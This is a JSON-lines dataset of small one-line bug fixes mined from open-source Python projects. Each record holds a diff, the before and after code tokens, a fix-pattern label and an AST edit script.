{"project": "django-mongodbforms", "commit_sha": "b71981f01da6476a4f1db0123526b319d8ca12cc", "parent_sha": "80606d540c2ecc7de6fcc91e52045a84c34913bc", "file_path": "mongodbforms/documents.py", "project_url": "https://github.com/Bahus/django-mongodbforms", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -356,7 +356,7 @@ class BaseDocumentForm(BaseForm):\n                 value = getattr(self.instance, f.name)\n                 if f.name not in exclude:\n                     f.validate(value)\n-                elif value == '':\n+                elif value == '' or value == []:\n                     # mongoengine chokes on empty strings for fields\n                     # that are not required. Clean them up here, though\n                     # this is maybe not the right place :-)\n", "before": "if f . name not in exclude : f . validate ( value ) elif value == '' : ", "after": "if f . name not in exclude : f . validate ( value ) elif value == '' or value == [ ] : ", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"elif_clause\", 3, 17, 3, 34], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 22, 3, 33], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:value\", \"T\"], 0], [\"Insert\", \"N1\", [\"==:==\", \"T\"], 1], [\"Insert\", \"N1\", [\"list\", \"N2\"], 2], [\"Insert\", \"N2\", [\"[:[\", \"T\"], 0], [\"Insert\", \"N2\", [\"]:]\", \"T\"], 1]]"}
{"project": "GitPython", "commit_sha": "3e79604c8bdfc367f10a4a522c9bf548bdb3ab9a", "parent_sha": "14851034ab5204ddb7329eb34bb0964d3f206f2b", "file_path": "git/remote.py", "project_url": "https://github.com/scls19fr/GitPython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -555,7 +555,7 @@ class Remote(LazyMixin, Iterable):\n             line = line.decode(defenc)\n             line = line.rstrip()\n             for pline in progress_handler(line):\n-                if line.startswith('fatal:'):\n+                if line.startswith('fatal:') or line.startswith('error:'):\n                     raise GitCommandError((\"Error when fetching: %s\" % line,), 2)\n                 # END handle special messages\n                 for cmd in cmds:\n", "before": "if line . startswith ( 'fatal:' ) : raise GitCommandError ( ( \"Error when fetching: %s\" % line , ) , 2 )", "after": "if line . startswith ( 'fatal:' ) or line . startswith ( 'error:' ) : raise GitCommandError ( ( \"Error when fetching: %s\" % line , ) , 2 )", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 17, 4, 82], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"call\", 3, 20, 3, 45], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"call\", \"N1\"], 2], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 0], [\"Insert\", \"N1\", [\"argument_list\", \"N3\"], 1], [\"Insert\", \"N2\", [\"identifier:line\", \"T\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:startswith\", \"T\"], 2], [\"Insert\", \"N3\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N3\", [\"string:'error:'\", \"T\"], 1], [\"Insert\", \"N3\", [\"):)\", \"T\"], 2]]"}
{"project": "netbox", "commit_sha": "e0aa2c33e9487b61f849ee036d01aba0729560e6", "parent_sha": "49f268a14caea8a2c47a4787053936be5569c631", "file_path": "netbox/utilities/templatetags/helpers.py", "project_url": "https://github.com/dewelloper/netbox", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -111,7 +111,7 @@ def example_choices(field, arg=3):\n         if len(examples) == arg:\n             examples.append('etc.')\n             break\n-        if not id:\n+        if not id or not label:\n             continue\n         examples.append(label)\n     return ', '.join(examples) or 'None'\n", "before": "if not id : continue", "after": "if not id or not label : continue", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"not_operator\", 3, 12, 3, 18], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"identifier:id\", 3, 16, 3, 18], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"not_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"not:not\", \"T\"], 0], [\"Insert\", \"N1\", [\"identifier:label\", \"T\"], 1]]"}
{"project": "netbox", "commit_sha": "1890e710cb62ce5a0fcf79619287a6aa518bb3fc", "parent_sha": "a9fefbec5cb1d4363b94b7223d3b6c958ab999c6", "file_path": "netbox/utilities/utils.py", "project_url": "https://github.com/dewelloper/netbox", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -27,7 +27,7 @@ def csv_format(data):\n             value = '{}'.format(value)\n \n         # Double-quote the value if it contains a comma\n-        if ',' in value:\n+        if ',' in value or '\\n' in value:\n             csv.append('\"{}\"'.format(value))\n         else:\n             csv.append('{}'.format(value))\n", "before": "if ',' in value : csv . append ( '\"{}\"' . format ( value ) ) else : csv . append ( '{}' . format ( value ) )", "after": "if ',' in value or '\\n' in value : csv . append ( '\"{}\"' . format ( value ) ) else : csv . append ( '{}' . format ( value ) )", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 6, 43], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 12, 3, 24], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"string:'\\\\n'\", \"T\"], 0], [\"Insert\", \"N1\", [\"in:in\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:value\", \"T\"], 2]]"}
{"project": "ansible", "commit_sha": "9ad90de4bc7f1835e909f8e2d96578391e188de6", "parent_sha": "633263d5355b4729ab16f7689689754ba015507a", "file_path": "lib/ansible/plugins/callback/foreman.py", "project_url": "https://github.com/joedugdale/ansible", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -224,7 +224,7 @@ class CallbackModule(CallbackBase):\n         res = result._result\n         module = result._task.action\n \n-        if module == 'setup':\n+        if module == 'setup' or 'ansible_facts' in res:\n             host = result._host.get_name()\n             self.send_facts(host, res)\n         else:\n", "before": "if module == 'setup' : host = result . _host . get_name ( ) self . send_facts ( host , res ) else : ", "after": "if module == 'setup' or 'ansible_facts' in res : host = result . _host . get_name ( ) self . send_facts ( host , res ) else : ", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 6, 14], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 12, 3, 29], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"string:'ansible_facts'\", \"T\"], 0], [\"Insert\", \"N1\", [\"in:in\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:res\", \"T\"], 2]]"}
{"project": "sphinx", "commit_sha": "7a6f2ae8949bca7a0c2a4aa2e4984297cee52c63", "parent_sha": "07caa321d33857a7881a5e0a2510cba26c7bda9f", "file_path": "sphinx/ext/autodoc.py", "project_url": "https://github.com/jarrodmillman/sphinx", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -293,7 +293,7 @@ def format_annotation(annotation):\n             # arguments are in __parameters__.\n             params = None\n             if hasattr(annotation, '__args__'):\n-                if len(annotation.__args__) <= 2:\n+                if annotation.__args__ is None or len(annotation.__args__) <= 2:\n                     params = annotation.__args__\n                 else:  # typing.Callable\n                     args = ', '.join(format_annotation(a) for a in annotation.__args__[:-1])\n", "before": "if len ( annotation . __args__ ) <= 2 : params = annotation . __args__ else : args = ', ' . join ( format_annotation ( a ) for a in annotation . __args__ [ : - 1 ] )", "after": "if annotation . __args__ is None or len ( annotation . __args__ ) <= 2 : params = annotation . __args__ else : args = ', ' . join ( format_annotation ( a ) for a in annotation . __args__ [ : - 1 ] )", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 17, 6, 93], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 20, 3, 49], 2], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 0], [\"Insert\", \"N1\", [\"is:is\", \"T\"], 1], [\"Insert\", \"N1\", [\"none:None\", \"T\"], 2], [\"Insert\", \"N2\", [\"identifier:annotation\", \"T\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:__args__\", \"T\"], 2]]"}
{"project": "sphinx", "commit_sha": "f04adb1aa6dce9ff2b74883345c91c2916ae7e43", "parent_sha": "4250052eda05717d8069b0c4820d3978c3760fe5", "file_path": "sphinx/ext/autodoc.py", "project_url": "https://github.com/jarrodmillman/sphinx", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -283,7 +283,7 @@ def format_annotation(annotation):\n             # arguments are in __parameters__.\n             params = None\n             if hasattr(annotation, '__args__'):\n-                if len(annotation.__args__) <= 2:\n+                if annotation.__args__ is None or len(annotation.__args__) <= 2:\n                     params = annotation.__args__\n                 else:  # typing.Callable\n                     args = ', '.join(format_annotation(a) for a in annotation.__args__[:-1])\n", "before": "if len ( annotation . __args__ ) <= 2 : params = annotation . __args__ else : args = ', ' . join ( format_annotation ( a ) for a in annotation . __args__ [ : - 1 ] )", "after": "if annotation . __args__ is None or len ( annotation . __args__ ) <= 2 : params = annotation . __args__ else : args = ', ' . join ( format_annotation ( a ) for a in annotation . __args__ [ : - 1 ] )", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 17, 6, 93], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 20, 3, 49], 2], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 0], [\"Insert\", \"N1\", [\"is:is\", \"T\"], 1], [\"Insert\", \"N1\", [\"none:None\", \"T\"], 2], [\"Insert\", \"N2\", [\"identifier:annotation\", \"T\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:__args__\", \"T\"], 2]]"}
{"project": "statsmodels", "commit_sha": "83b04f0ca7a8a54350877112c646de4391a65708", "parent_sha": "dd7d26cde0f199bfb75a53bf1af55a68c65cd61a", "file_path": "statsmodels/base/data.py", "project_url": "https://github.com/jarrodmillman/statsmodels", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -78,7 +78,7 @@ class ModelData(object):\n         combined_2d_names = []\n         if len(kwargs):\n             for key, value_array in kwargs.iteritems():\n-                if value_array is None:\n+                if value_array is None or value_array.ndim == 0:\n                     none_array_names += [key]\n                     continue\n                 # grab 1d arrays\n", "before": "if value_array is None : none_array_names += [ key ] continue", "after": "if value_array is None or value_array . ndim == 0 : none_array_names += [ key ] continue", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 17, 5, 29], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 20, 3, 39], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 0], [\"Insert\", \"N1\", [\"==:==\", \"T\"], 1], [\"Insert\", \"N1\", [\"integer:0\", \"T\"], 2], [\"Insert\", \"N2\", [\"identifier:value_array\", \"T\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:ndim\", \"T\"], 2]]"}
{"project": "dnf", "commit_sha": "29c3e927aa4f381f62da16e038d4abf7e39e1fa8", "parent_sha": "c956369291a1497c35ec12b5e3fb0af402c735dd", "file_path": "dnf/modules.py", "project_url": "https://github.com/eclipseo/dnf", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -470,7 +470,7 @@ class RepoModuleDict(OrderedDict):\n \n         for version in self.list_module_version_all():\n             conf = version.parent.parent.conf\n-            if conf is None or not conf.enabled:\n+            if conf is None or not conf.enabled or version.stream != conf.stream:\n                 versions.append(version)\n \n         return versions\n", "before": "if conf is None or not conf . enabled : versions . append ( version )", "after": "if conf is None or not conf . enabled or version . stream != conf . stream : versions . append ( version )", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"not_operator\", 3, 32, 3, 48], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"attribute\", 3, 36, 3, 48], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 0], [\"Insert\", \"N1\", [\"!=:!=\", \"T\"], 1], [\"Insert\", \"N1\", [\"attribute\", \"N3\"], 2], [\"Insert\", \"N2\", [\"identifier:version\", \"T\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:stream\", \"T\"], 2], [\"Insert\", \"N3\", [\"identifier:conf\", \"T\"], 0], [\"Insert\", \"N3\", [\".:.\", \"T\"], 1], [\"Insert\", \"N3\", [\"identifier:stream\", \"T\"], 2]]"}
{"project": "corpkit", "commit_sha": "837ef8a67d570bba7990ca18021fe88f213cd8f6", "parent_sha": "60ed800130cc45df6665eced1276e1d17ce32cf6", "file_path": "corpkit/editor.py", "project_url": "https://github.com/akshayjh/corpkit", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -405,7 +405,7 @@ def editor(interrogation,\n             parsed_input = [w for w in list(df) if re.search(regex, w)]\n             return parsed_input\n         from dictionaries.process_types import Wordlist\n-        if type(the_input) == Wordlist:\n+        if type(the_input) == Wordlist or the_input.__class__ == Wordlist:\n             the_input = list(the_input)\n         if type(the_input) == list:\n             if type(the_input[0]) == int:\n", "before": "if type ( the_input ) == Wordlist : the_input = list ( the_input )", "after": "if type ( the_input ) == Wordlist or the_input . __class__ == Wordlist : the_input = list ( the_input )", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 4, 40], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 12, 3, 39], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 0], [\"Insert\", \"N1\", [\"==:==\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:Wordlist\", \"T\"], 2], [\"Insert\", \"N2\", [\"identifier:the_input\", \"T\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:__class__\", \"T\"], 2]]"}
{"project": "westpa_py3", "commit_sha": "d3fff35d7da716745cb3f547eaec093fb3488897", "parent_sha": "389fcf1ef8577ba6c7ded9f831f3d911f1cebcfa", "file_path": "src/wemd/states.py", "project_url": "https://github.com/mczwier/westpa_py3", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -89,7 +89,7 @@ class BasisState:\n             except IndexError:\n                 data_ref = None\n                 \n-            states.append(cls(state_id=None,probability=probability,label=label,data_ref=data_ref))\n+            states.append(cls(state_id=None,probability=probability,label=label,auxref=data_ref))\n         return states\n     \n class InitialState:\n", "before": "states . append ( cls ( state_id = None , probability = probability , label = label , data_ref = data_ref ) )", "after": "states . append ( cls ( state_id = None , probability = probability , label = label , auxref = data_ref ) )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:data_ref\", 3, 81, 3, 89], \"auxref\"]]"}
{"project": "westpa_py3", "commit_sha": "03b72958e77083753a42f01d586a86256dbebc97", "parent_sha": "311738e03293243f20a875b95c38a5b686d1df93", "file_path": "lib/cmds/w_trace.py", "project_url": "https://github.com/mczwier/westpa_py3", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -63,7 +63,7 @@ class WTrace(CommonOutputMixin,WEMDDataReaderMixin,WEMDAnalysisTool):\n                 p_parent_id = seg_info['parent_id']                 \n                 segments.append(Segment(n_iter=n_iter, seg_id=seg_id, \n                                         weight=seg_info['weight'],\n-                                        p_parent_id=p_parent_id,\n+                                        parent_id=p_parent_id,\n                                         pcoord=final_pcoord))                \n                 seg_id = p_parent_id\n                 n_iter -= 1\n", "before": "segments . append ( Segment ( n_iter = n_iter , seg_id = seg_id , weight = seg_info [ 'weight' ] , p_parent_id = p_parent_id , pcoord = final_pcoord ) )", "after": "segments . append ( Segment ( n_iter = n_iter , seg_id = seg_id , weight = seg_info [ 'weight' ] , parent_id = p_parent_id , pcoord = final_pcoord ) )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:p_parent_id\", 3, 41, 3, 52], \"parent_id\"]]"}
{"project": "foxtail", "commit_sha": "452f86216a42d5764ac3e2b90c2f5637d55bbf03", "parent_sha": "18a892fc152b09189d924b143e6568cc42b490ee", "file_path": "apps/content/views.py", "project_url": "https://github.com/dmptrluke/foxtail", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -15,7 +15,7 @@ def get_context_data(self, **kwargs):\n         context = super().get_context_data(**kwargs)\n         today = datetime.today()\n         context['post_list'] = Post.objects.all()[:3]\n-        context['event_list'] = Event.objects.filter(end__date__gte=today)[:3]\n+        context['event_list'] = Event.objects.filter(end__gte=today)[:3]\n         return context\n \n \n", "before": "context [ 'event_list' ] = Event . objects . filter ( end__date__gte = today ) [ : 3 ]", "after": "context [ 'event_list' ] = Event . objects . filter ( end__gte = today ) [ : 3 ]", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:end__date__gte\", 3, 54, 3, 68], \"end__gte\"]]"}
{"project": "steward_palantir", "commit_sha": "9137f5b84eb65d0ba0ac312456c28a145cad4df9", "parent_sha": "573bf3ffedfd166e7e2f29b516b1dd225b8f90f5", "file_path": "steward_palantir/views.py", "project_url": "https://github.com/mathcamp/steward_palantir", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -251,7 +251,7 @@ def delete_minion(request):\n     \"\"\" Delete a minion and its data \"\"\"\n     minion = request.param('minion')\n     request.db.query(MinionDisabled).filter_by(name=minion).delete()\n-    request.db.query(CheckResult).filter_by(name=minion).delete()\n+    request.db.query(CheckResult).filter_by(minion=minion).delete()\n     return request.response\n \n @view_config(route_name='palantir_prune_minions', renderer='json',\n", "before": "request . db . query ( CheckResult ) . filter_by ( name = minion ) . delete ( )", "after": "request . db . query ( CheckResult ) . filter_by ( minion = minion ) . delete ( )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:name\", 3, 45, 3, 49], \"minion\"]]"}
{"project": "neutron", "commit_sha": "98371a6c83d1d866b98ac4a8c9c7b8b4686c42c9", "parent_sha": "257341a7a6094bfa56c7564a09ff414d667d4957", "file_path": "neutron/plugins/ml2/drivers/openvswitch/agent/extension_drivers/qos_driver.py", "project_url": "https://github.com/noironetworks/neutron", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -123,7 +123,7 @@ class QosOVSAgentDriver(qos.QosLinuxAgentDriver):\n                                                     RULE_TYPE_DSCP_MARKING, 0)\n         if dscp_port:\n             port_num = dscp_port['vif_port'].ofport\n-            self.br_int.uninstall_flows(in_port=port_num, table=0, reg2=0)\n+            self.br_int.uninstall_flows(in_port=port_num, table_id=0, reg2=0)\n         else:\n             LOG.debug(\"delete_dscp_marking was received for port %s but \"\n                       \"no port information was stored to be deleted\",\n", "before": "self . br_int . uninstall_flows ( in_port = port_num , table = 0 , reg2 = 0 )", "after": "self . br_int . uninstall_flows ( in_port = port_num , table_id = 0 , reg2 = 0 )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:table\", 3, 59, 3, 64], \"table_id\"]]"}
{"project": "TheKeep", "commit_sha": "55126182a9fe04a41366e750c76fad4e32727663", "parent_sha": "7180b5a3095703981283a45149478dce3b2b0650", "file_path": "keep/file/views.py", "project_url": "https://github.com/emory-libraries/TheKeep", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -208,7 +208,7 @@ def ingest_files(files, collection, comment, request):\n         # initialize a new object from the file\n         obj = objtype.init_from_file(filename, initial_label=label,\n                                      request=request, checksum=md5,\n-                                     master_mimetype=type)\n+                                     mimetype=type)\n \n         # set collection on ingest\n         obj.collection = collection\n", "before": "obj = objtype . init_from_file ( filename , initial_label = label , request = request , checksum = md5 , master_mimetype = type )", "after": "obj = objtype . init_from_file ( filename , initial_label = label , request = request , checksum = md5 , mimetype = type )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:master_mimetype\", 3, 38, 3, 53], \"mimetype\"]]"}
{"project": "wardenclyffe", "commit_sha": "427d09b321e39b062bf84466f4acc2dab59e2be5", "parent_sha": "c1ea310f8aa197bfb662251d348253821791d596", "file_path": "wardenclyffe/mediathread/views.py", "project_url": "https://github.com/ccnmtl/wardenclyffe", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -104,7 +104,7 @@ def mediathread_post(request):\n             audio_flag = waffle.flag_is_active(request, 'encode_audio')\n             operations, params = v.make_default_operations(\n                 tmpfilename, source_file, user, audio=audio,\n-                encode_audio=audio_flag)\n+                audio_flag=audio_flag)\n \n             if not audio_flag:\n                 # fallback to PCP version instead of encoding it locally\n", "before": "operations , params = v . make_default_operations ( tmpfilename , source_file , user , audio = audio , encode_audio = audio_flag )", "after": "operations , params = v . make_default_operations ( tmpfilename , source_file , user , audio = audio , audio_flag = audio_flag )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:encode_audio\", 3, 17, 3, 29], \"audio_flag\"]]"}
{"project": "gnn", "commit_sha": "16553fd759e70d93824407f18cdea419703d85d4", "parent_sha": "c3293a9bad06dd13b5f6edbf4d35d2a959b60185", "file_path": "gcn/metrics.py", "project_url": "https://github.com/zdcuob/gnn", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -3,7 +3,7 @@ import tensorflow as tf\n \n def masked_softmax_cross_entropy(preds, labels, mask):\n     \"\"\"Softmax cross-entropy loss with masking.\"\"\"\n-    loss = tf.nn.softmax_cross_entropy_with_logits(logits=preds, lables=labels)\n+    loss = tf.nn.softmax_cross_entropy_with_logits(logits=preds, labels=labels)\n     mask = tf.cast(mask, dtype=tf.float32)\n     mask /= tf.reduce_mean(mask)\n     loss *= mask\n", "before": "loss = tf . nn . softmax_cross_entropy_with_logits ( logits = preds , lables = labels )", "after": "loss = tf . nn . softmax_cross_entropy_with_logits ( logits = preds , labels = labels )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:lables\", 3, 66, 3, 72], \"labels\"]]"}
{"project": "csnews_multilingual", "commit_sha": "678bf244e181f27b12a99ff092bf0e4f70378910", "parent_sha": "e2f3c95a50faf466c94da2deb0b0160d75d770b5", "file_path": "csnews_multilingual/views.py", "project_url": "https://github.com/codesyntax/csnews_multilingual", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -29,7 +29,7 @@ def index(request):\n \n \n def article_index(request, article_slug):\n-    obj = get_object_or_404(Article, slug=article_slug, language=get_language())\n+    obj = get_object_or_404(Article, slug=article_slug, translations__language_code=get_language())\n     return render_to_response('news/article.html', locals(), context_instance=RequestContext(request))\n \n \n", "before": "obj = get_object_or_404 ( Article , slug = article_slug , language = get_language ( ) )", "after": "obj = get_object_or_404 ( Article , slug = article_slug , translations__language_code = get_language ( ) )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:language\", 3, 57, 3, 65], \"translations__language_code\"]]"}
{"project": "revizor-tests", "commit_sha": "1fc148faec846a98543bd4f70af42030284479c9", "parent_sha": "4e3f738a1b4afe0d5456d4ca0c607dde5974369d", "file_path": "functional/lifecycle/steps/new_pkg_update_steps.py", "project_url": "https://github.com/Scalr/revizor-tests", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -107,7 +107,7 @@ def installing_scalarizr(step, serv_as=''):\n     else:\n         # Wait ssh\n         user=get_user_name()\n-        world.cloud._wait_ssh(server.public_ip, user=user)\n+        world.cloud._wait_ssh(server.public_ip, username=user)\n         LOG.info('Installing scalarizr from branch: %s to node: %s ' % (branch, node.name))\n         repo_type = 'release' if  branch in ['latest', 'stable'] else 'develop'\n         cmd = '{curl_install} && ' \\\n", "before": "world . cloud . _wait_ssh ( server . public_ip , user = user )", "after": "world . cloud . _wait_ssh ( server . public_ip , username = user )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:user\", 3, 49, 3, 53], \"username\"]]"}
{"project": "redirect", "commit_sha": "f25cbdb645ab6da031a4e1812c2dcd147ed276f5", "parent_sha": "0e0ed839372093835c339309156de0fad6ba8801", "file_path": "integration/verify.py", "project_url": "https://github.com/syncloud/redirect", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -442,6 +442,6 @@ def test_drop_device(domain):\n                              verify=False)\n     assert response.status_code == 200\n \n-    response = requests.get('https://api.{0}/domain/get'.format(domain), query_string={'token': update_token},\n+    response = requests.get('https://api.{0}/domain/get'.format(domain), params={'token': update_token},\n                             verify=False)\n     assert response.status_code == 400\n\\ No newline at end of file\n", "before": "response = requests . get ( 'https://api.{0}/domain/get' . format ( domain ) , query_string = { 'token' : update_token } , verify = False )", "after": "response = requests . get ( 'https://api.{0}/domain/get' . format ( domain ) , params = { 'token' : update_token } , verify = False )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:query_string\", 3, 74, 3, 86], \"params\"]]"}
{"project": "searx", "commit_sha": "b422788eb46906d9befbd8b7399bf4653e1fb14e", "parent_sha": "ee8cabf496a27030c4035266e92c792ce294b013", "file_path": "searx/autocomplete.py", "project_url": "https://github.com/MarcAbonce/searx", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -69,7 +69,7 @@ def wikipedia(query):\n     # wikipedia autocompleter\n     url = 'https://en.wikipedia.org/w/api.php?action=opensearch&{0}&limit=10&namespace=0&format=json'  # noqa\n \n-    resp = loads(get(url.format(urlencode(dict(q=query)))).text)\n+    resp = loads(get(url.format(urlencode(dict(search=query)))).text)\n     if len(resp) > 1:\n         return resp[1]\n     return []\n", "before": "resp = loads ( get ( url . format ( urlencode ( dict ( q = query ) ) ) ) . text )", "after": "resp = loads ( get ( url . format ( urlencode ( dict ( search = query ) ) ) ) . text )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:q\", 3, 48, 3, 49], \"search\"]]"}
{"project": "iterative-Random-Forest", "commit_sha": "be2d75a1e86ba14f7b837e40563b1b8c9cc3109a", "parent_sha": "b3804e95d8f77b9d584b7463949153fad39b61fd", "file_path": "scikits/learn/tests/test_naive_bayes.py", "project_url": "https://github.com/Yu-Group/iterative-Random-Forest", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -89,7 +89,7 @@ def test_sparse_mnnb():\n def test_mnnb_pickle():\n     '''Test picklability of multinomial NB'''\n \n-    clf = naive_bayes.MultinomialNB(alpha=2, use_prior=False).fit(X, y)\n+    clf = naive_bayes.MultinomialNB(alpha=2, fit_prior=False).fit(X, y)\n     y_pred = clf.predict(X)\n \n     store = StringIO()\n", "before": "clf = naive_bayes . MultinomialNB ( alpha = 2 , use_prior = False ) . fit ( X , y )", "after": "clf = naive_bayes . MultinomialNB ( alpha = 2 , fit_prior = False ) . fit ( X , y )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:use_prior\", 3, 46, 3, 55], \"fit_prior\"]]"}
{"project": "iterative-Random-Forest", "commit_sha": "b1f597530cfd251cf7153e1c3aa878efbdf5fa5a", "parent_sha": "3746eb68904e7fabf9456ddd4659efdd59168d18", "file_path": "sklearn/linear_model/randomized_lasso.py", "project_url": "https://github.com/Yu-Group/iterative-Random-Forest", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -90,7 +90,7 @@ class BaseRandomizedLinearModel(TransformerMixin):\n         n_samples, n_features = X.shape\n         y = np.atleast_1d(y)\n \n-        X = as_float_array(X, overwrite_X=False)\n+        X = as_float_array(X, copy=False)\n \n         X, y, X_mean, y_mean, X_std = self._center_data(X, y,\n                                                         self.fit_intercept,\n", "before": "X = as_float_array ( X , overwrite_X = False )", "after": "X = as_float_array ( X , copy = False )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:overwrite_X\", 3, 31, 3, 42], \"copy\"]]"}
